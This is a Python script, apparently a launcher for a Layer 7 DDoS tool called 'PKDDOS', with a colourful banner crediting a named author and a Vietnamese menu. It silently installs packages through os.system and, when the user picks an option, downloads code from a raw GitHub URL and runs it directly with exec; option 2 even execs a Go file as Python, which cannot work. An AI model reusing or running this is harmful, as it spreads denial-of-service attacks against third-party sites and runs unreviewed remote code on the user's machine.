import os
import sys
import re
import json
import random
from time import sleep
import threading
from time import strftime

try:
    import requests
    import pystyle
except ImportError:
    os.system('pip install requests && pip install bs4 && pip install pystyle && pip install clear && pip install strftime')

def banner():
    print(''' 
[38;2;255;0;255m    [38;2;249;6;255m    [38;2;243;12;255m ▄[38;2;237;18;255m█[38;2;231;24;255m█[38;2;225;30;255m█[38;2;219;36;255m█[38;2;213;42;255m█[38;2;207;48;255m█[38;2;201;54;255m█[38;2;195;60;255m▄ [38;2;189;66;255m  [38;2;183;72;255m[38;2;177;78;255m [38;2;171;84;255m▄[38;2;165;90;255m█ [38;2;159;96;255m  [38;2;153;102;255m▄[38;2;147;108;255m█[38;2;141;114;255m▄[38;2;135;120;255m [38;2;129;126;255m [38;2;123;132;255m [38;2;117;138;255m [38;2;111;144;255m [38;2;105;150;255m█[38;2;99;156;255m█[38;2;93;162;255m█[38;2;87;168;255m [38;2;81;174;255m   [38;2;75;180;255m  ▄[38;2;69;186;255m████[38;2;63;192;255m██▄[38;2;57;198;255m   ▄█[38;2;51;204;255m█████▄   ▄█       
[38;2;255;0;255m    [38;2;249;6;255m    [38;2;243;12;255m █[38;2;237;18;255m█[38;2;231;24;255m█[38;2;225;30;255m [38;2;219;36;255m [38;2;213;42;255m [38;2;207;48;255m █[38;2;201;54;255m█[38;2;195;60;255m█ [38;2;189;66;255m [38;2;183;72;255m [38;2;177;78;255m[38;2;171;84;255m█[38;2;165;90;255m█ [38;2;159;96;255m▄[38;2;153;102;255m█[38;2;147;108;255m█[38;2;141;114;255m█[38;2;135;120;255m▀ [38;2;129;126;255m▀[38;2;123;132;255m█[38;2;117;138;255m█[38;2;111;144;255m█[38;2;105;150;255m█[38;2;99;156;255m█[38;2;93;162;255m█[38;2;87;168;255m█[38;2;81;174;255m██[38;2;75;180;255m▄ █[38;2;69;186;255m██  [38;2;63;192;255m  ██[38;2;57;198;255m█ ██[38;2;51;204;255m█    ███ ███       
[38;2;255;0;255m    [38;2;249;6;255m    [38;2;243;12;255m █[38;2;237;18;255m█[38;2;231;24;255m█[38;2;225;30;255m [38;2;219;36;255m [38;2;213;42;255m [38;2;207;48;255m █[38;2;201;54;255m█[38;2;195;60;255m█ [38;2;189;66;255m [38;2;183;72;255m [38;2;177;78;255m█[38;2;171;84;255m█[38;2;165;90;255m█[38;2;159;96;255m▐[38;2;153;102;255m█[38;2;147;108;255m█[38;2;141;114;255m▀[38;2;135;120;255m  [38;2;129;126;255m [38;2;123;132;255m [38;2;117;138;255m[38;2;111;144;255m ▀█[38;2;105;150;255m█[38;2;99;156;255m█[38;2;93;162;255m▀[38;2;87;168;255m▀[38;2;81;174;255m██[38;2;75;180;255m █[38;2;69;186;255m██   [38;2;63;192;255m ██[38;2;57;198;255m█ ██[38;2;51;204;255m█    ███ ███       
[38;2;255;0;255m    [38;2;249;6;255m    [38;2;243;12;255m █[38;2;237;18;255m█[38;2;231;24;255m█[38;2;225;30;255m [38;2;219;36;255m [38;2;213;42;255m [38;2;207;48;255m █[38;2;201;54;255m█[38;2;195;60;255m█ [38;2;189;66;255m [38;2;183;72;255m▄[38;2;177;78;255m█[38;2;171;84;255m█[38;2;165;90;255m█[38;2;159;96;255m█[38;2;153;102;255m█[38;2;147;108;255m▀[38;2;141;114;255m [38;2;135;120;255m  [38;2;129;126;255m [38;2;123;132;255m [38;2;117;138;255m [38;2;111;144;255m [38;2;105;150;255m█[38;2;99;156;255m██[38;2;93;162;255m [38;2;87;168;255m  [38;2;81;174;255m▀ [38;2;75;180;255m██[38;2;69;186;255m█   [38;2;63;192;255m ███[38;2;57;198;255m ███[38;2;51;204;255m    ███ ███       
[38;2;255;0;255m    [38;2;249;6;255m  ▀█[38;2;243;12;255m█[38;2;237;18;255m█[38;2;231;24;255m█[38;2;225;30;255m█[38;2;219;36;255m█[38;2;213;42;255m█[38;2;207;48;255m██[38;2;201;54;255m▀[38;2;195;60;255m  [38;2;189;66;255m▀[38;2;183;72;255m▀[38;2;177;78;255m█[38;2;171;84;255m█[38;2;165;90;255m█[38;2;159;96;255m█[38;2;153;102;255m█[38;2;147;108;255m▄[38;2;141;114;255m [38;2;135;120;255m  [38;2;129;126;255m [38;2;123;132;255m [38;2;117;138;255m [38;2;111;144;255m █[38;2;105;150;255m█[38;2;99;156;255m█[38;2;93;162;255m [38;2;87;168;255m  [38;2;81;174;255m  [38;2;75;180;255m██[38;2;69;186;255m█   [38;2;63;192;255m ███[38;2;57;198;255m ███[38;2;51;204;255m    ███ ███       
[38;2;255;0;255m    [38;2;249;6;255m    [38;2;243;12;255m █[38;2;237;18;255m█[38;2;231;24;255m█[38;2;225;30;255m [38;2;219;36;255m [38;2;213;42;255m [38;2;207;48;255m  [38;2;201;54;255m [38;2;195;60;255m   [38;2;189;66;255m [38;2;183;72;255m█[38;2;177;78;255m█[38;2;171;84;255m█[38;2;165;90;255m[38;2;159;96;255m ▐[38;2;153;102;255m█[38;2;147;108;255m▄[38;2;141;114;255m [38;2;135;120;255m  [38;2;129;126;255m [38;2;123;132;255m [38;2;117;138;255m  [38;2;111;144;255m█[38;2;105;150;255m█[38;2;99;156;255m█[38;2;93;162;255m [38;2;87;168;255m  [38;2;81;174;255m  [38;2;75;180;255m██[38;2;69;186;255m█   [38;2;63;192;255m ███[38;2;57;198;255m ███[38;2;51;204;255m    ███ ███       
[38;2;255;0;255m    [38;2;249;6;255m    [38;2;243;12;255m █[38;2;237;18;255m█[38;2;231;24;255m█[38;2;225;30;255m [38;2;219;36;255m [38;2;213;42;255m [38;2;207;48;255m  [38;2;201;54;255m [38;2;195;60;255m   [38;2;189;66;255m [38;2;183;72;255m█[38;2;177;78;255m█[38;2;171;84;255m█[38;2;165;90;255m ▀[38;2;159;96;255m█[38;2;153;102;255m█[38;2;147;108;255m█[38;2;141;114;255m▄[38;2;135;120;255m [38;2;129;126;255m [38;2;123;132;255m [38;2;117;138;255m  [38;2;111;144;255m█[38;2;105;150;255m█[38;2;99;156;255m█[38;2;93;162;255m [38;2;87;168;255m [38;2;81;174;255m   [38;2;75;180;255m██[38;2;69;186;255m█  [38;2;63;192;255m  ███[38;2;57;198;255m ███[38;2;51;204;255m    ███ ███▌    ▄ 
[38;2;255;0;255m    [38;2;249;6;255m   ▄[38;2;243;12;255m█[38;2;237;18;255m█[38;2;231;24;255m█[38;2;225;30;255m█[38;2;219;36;255m▀[38;2;213;42;255m [38;2;207;48;255m  [38;2;201;54;255m [38;2;195;60;255m   [38;2;189;66;255m █[38;2;183;72;255m█[38;2;177;78;255m█[38;2;171;84;255m [38;2;165;90;255m  [38;2;159;96;255m▀[38;2;153;102;255m█[38;2;147;108;255m▀[38;2;141;114;255m [38;2;135;120;255m [38;2;129;126;255m [38;2;123;132;255m [38;2;117;138;255m▄[38;2;111;144;255m█[38;2;105;150;255m█[38;2;99;156;255m█[38;2;93;162;255m█[38;2;87;168;255m▀ [38;2;81;174;255m   [38;2;75;180;255m▀█[38;2;69;186;255m██[38;2;63;192;255m███▀ [38;2;57;198;255m  ▀█[38;2;51;204;255m█████▀  █████▄▄██     
[1;36m             ═══════════╦═══════════════════╦══════════
                        ║ Layer7 FUll POWER ║
       ╔════════════════╩═══════════════════╩════════════════╗
       ║          Nguyễn Trương Thiện Phát                   ║
       ║         facebook.com/100047128875560                ║
       ╚═════════════════════════════════════════════════════╝
''')
    
def d():
    a = "\033[1;91m=\033[1;97m=" * 30
    for i in range(len(a)):
        sys.stdout.write(a[i])
        sys.stdout.flush()
        sleep(0.001)
    print()

def delay(dl):
    try:
        for i in range(dl, -1, -1):
            print(sr+'Chờ '+r+' '+str(i)+' Giây [-]          ', end='\r')
            sleep(0.2)
            print(sr+'Chờ '+r+' '+str(i)+' Giây [\]          ', end='\r')
            sleep(0.2)
            print(sr+'Chờ '+r+' '+str(i)+' Giây [|]          ', end='\r')
            sleep(0.2)
            print(sr+'Chờ '+r+' '+str(i)+' Giây [/]          ', end='\r')
            sleep(0.2)
            print(sr+'Chờ '+r+' '+str(i)+' Giây [🔥]          ', end='\r')
            sleep(0.2)
    except:
        sleep(dl)
        print(dl, end='\r')

s = "\033[1;91m『\033[1;97m亗\033[1;91m』"
r = "\033[1;97m▶▶\033[1;92m"
sr = s+r+' '

from pystyle import Add, Center, Anime, Colors, Colorate, Write, System

def ra(a):
    for i in range(len(a)):
        sys.stdout.write(a[i])
        sys.stdout.flush()
    print()

def main():
    d()
    from pystyle import Box
    os.system('clear')
    banner()
    d()
    print("- - - - - - - - - - - PKDDOS NTTP - - - - - - - - - - - - -")
    print()
    print(sr+"Nhập [1] PKTOOL DDOS")
    print()
    d()
    abc = int(input(sr+"Nhập Số : "))
    d()

    try:
        if abc == 1:
            exec(requests.get("https://raw.githubusercontent.com/Kenne400k/nxt/main/pk.py").text)
        elif abc == 2:
            exec(requests.get("https://raw.githubusercontent.com/Kenne400k/nxt/main/pk1.go").text)
    except:
        pass

if __name__ == "__main__":
    main()
